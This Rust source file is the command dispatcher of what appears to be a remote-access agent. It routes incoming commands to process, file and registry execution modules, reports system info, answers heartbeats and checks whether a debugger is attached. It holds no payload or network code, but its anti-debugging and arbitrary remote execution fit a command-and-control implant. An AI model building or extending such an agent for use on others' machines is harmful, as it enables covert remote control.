use protocol::messages::{Command, Response};
use agent_modules::{process_manager, file_manager, monitoring, registry_manager, execution};
use agent_hardening::{anti_debug};

pub struct AgentCore {
    pub id: u32,
}

impl AgentCore {
    pub fn new(id: u32) -> Self {
        Self { id }
    }

    pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
        // Check anti-debug before processing if needed
        if anti_debug::is_being_debugged() {
            println!("Warning: Agent is being debugged!");
        }

        match cmd {
            Command::Execute { cmd } => {
                if cmd.starts_with("proc:") {
                    process_manager::execute(cmd).await
                } else if cmd.starts_with("file:") {
                    file_manager::execute(cmd).await
                } else if cmd.starts_with("reg:") {
                    registry_manager::execute(cmd).await
                } else {
                    // Default to process manager for generic execution
                    process_manager::execute(cmd).await
                }
            }
            Command::GetSysInfo => {
                monitoring::get_sysinfo().await
            }
            Command::Heartbeat => Some(Response::Success),
            _ => None,
        }
    }

    pub async fn heartbeat(&self) -> Response {
        Response::Success
    }
}
